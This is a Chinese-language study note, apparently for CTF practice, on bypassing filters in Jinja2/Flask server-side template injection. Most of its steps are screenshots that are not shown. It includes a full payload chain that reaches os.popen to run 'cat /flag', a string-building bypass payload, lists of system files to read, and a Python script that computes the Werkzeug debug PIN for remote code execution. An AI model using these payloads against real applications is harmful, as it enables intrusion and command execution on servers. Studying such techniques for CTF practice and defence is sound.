
---
# 一、过滤     {{}}

使用
```
{% %}
```
![[屏幕截图 2024-12-16 224208.png]]

# 二、过滤 `[]` 

直接用`__getitem__(xx)`代替`[]`

![[屏幕截图 2024-12-17 194235.png]]


# 三、单，双引号过滤

使用  request
![[屏幕截图 2024-12-17 204241.png]]

代码示例

![[屏幕截图 2024-12-17 204604.png]]

get参数示范

![[屏幕截图 2024-12-17 210413.png]]

解析
![[屏幕截图 2024-12-17 211109.png]]


# 三、下划线过滤

1、过滤器

![[屏幕截图 2024-12-17 212509.png]]

示例
```
a=['HZH']
{{a|lower}}
像管道输出符，输出['hzh']
```

1、结合request
![[屏幕截图 2024-12-17 212935.png]]
```
attr() 把数据当成属性读取出来
通过atrr()和request组合绕过下划线

中括号的值需要用__getitem__()，大括号包括大括号的值不是在request的参数值中

后面的read()也要用attr('read')()

```
![[屏幕截图 2024-12-17 221009.png]]


2、结合编码绕过

![[屏幕截图 2024-12-17 221521.png]]![[屏幕截图 2024-12-17 221658.png]]
![[屏幕截图 2024-12-19 203600.png]]
![[屏幕截图 2024-12-19 203805.png]]
```

code={{()|attr('__class__')|attr('__mro__')|attr('__getitem__')(-1)|attr('__subclasses__')()|attr('__getitem__')(117)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')("cat /flag")|attr('read')()}}


```

# 四、点绕过 

使用中括号`['__calss__']`
也可用attr
![[屏幕截图 2024-12-19 212107.png]]

# 五、绕过关键词
![[屏幕截图 2024-12-19 213130.png]]
⑤种方法
![[屏幕截图 2024-12-19 213159.png]]

1、
![[屏幕截图 2024-12-19 213829.png]]
2、
翻转
![[屏幕截图 2024-12-19 214024 1.png]]

![[屏幕截图 2024-12-19 214155.png]]
3、ASCII码
![[屏幕截图 2024-12-19 214457.png]]

# 六、过滤数字

过滤器length
```
原理：先用过滤器计算出需要的数字
后面加入就行
```
![[屏幕截图 2024-12-19 215759.png]]

# 七、config获取

使用内置函数，迂回绕过，找到current_app模块下的config
![[屏幕截图 2024-12-19 220516.png]]

![[屏幕截图 2024-12-19 220650.png]]

# 八、混合过滤

拼接字符
![[屏幕截图 2024-12-20 210502.png]]

获取符号
![[屏幕截图 2024-12-20 211610.png]]


绕过示例
![[屏幕截图 2024-12-20 212807.png]]

```
code={%25set a=({}|select()|string()|list)[10]%25}{%25set b=((dict(cat=1)|join,a,dict(flag=1)|join)|join)%25}{{b}}
拼接成cat flag

pop可以代替__getitem__
```

七、debug ping码计算

![[屏幕截图 2024-12-20 224015.png]]


![[屏幕截图 2024-12-20 224056.png]]

第二、三个一般是不会变的

![[屏幕截图 2024-12-21 131344.png]]![[屏幕截图 2024-12-21 131458.png]]

![[屏幕截图 2024-12-21 131521.png]]

这个比较重要
![[屏幕截图 2024-12-21 131852.png]]

![[屏幕截图 2024-12-21 133807.png]]

搭配文件读取漏洞可debug
username        /etc/passwd
mod      使用venv可以看报错，没有则可以使用默认路径
![[屏幕截图 2024-12-21 145727.png]]
uuid(mac地址)  根据不同的操作系统读取  
![[屏幕截图 2024-12-21 145613.png]]
读取`/usr/local/lib/python3.7/site-packages/werkzeug/debug/__init__.py`
machine_id 
linux   直接读取`/etc/machine-id`
docker    `/etc/machine-id+/proc/self/cgroup`
`self`过滤
其中的`self`可以用相关进程的pid去替换,其实`1`就行
`cgroup`过滤
可以考虑`mountinfo`或者`cpuset`
```python
大概格式pyload，不同版本的不太相同

import hashlib  
from itertools import chain  
  
  
probably_public_bits=['huangzonghui',  
              'flask.app',  
              'Flask',  
              'E:\\BaiduNetdiskDownload\\python\\venv\\Lib\\site-packages\\flask\\app.py'  
              ]  
  
  
private_bits=['228944701361255',  
            b'26e9327f-a96f-4e1e-836f-bc63462e2b1d'  
                ]  
  
  
num=None  
rv=None  
  
h = hashlib.sha1()  
for bit in chain(probably_public_bits, private_bits):  
    if not bit:  
        continue  
    if isinstance(bit, str):  
        bit = bit.encode()  
    h.update(bit)  
h.update(b"cookiesalt")  
  
cookie_name = f"__wzd{h.hexdigest()[:20]}"  
  
  
if num is None:  
    h.update(b"pinsalt")  
    num = f"{int(h.hexdigest(), 16):09d}"[:9]  
  
  
if rv is None:  
    for group_size in 5, 4, 3:  
        if len(num) % group_size == 0:  
            rv = "-".join(  
                num[x : x + group_size].rjust(group_size, "0")  
                for x in range(0, len(num), group_size)  
            )  
            break  
    else:  
        rv = num  
print(rv)



```